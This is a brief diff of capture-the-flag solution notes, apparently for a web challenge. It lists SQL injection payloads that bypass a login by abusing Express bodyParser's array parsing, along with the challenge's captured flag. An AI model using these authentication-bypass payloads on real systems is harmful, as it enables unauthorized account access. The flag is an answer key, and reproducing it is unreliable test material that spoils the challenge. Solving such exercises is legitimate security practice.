@@ -1,0 +1,11 @@
+# Try unicode (Fail)
+username=admin＇--+-&password=a
+
+Because bodyParser.urlencoded({ extended: true });, we can use array
+
+Solution 1:
+username=admin&password[]='+or+1%3d1--+-
+	dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}
+
+Solution 2:
+username[]=admin' or 1=1/*&password=213
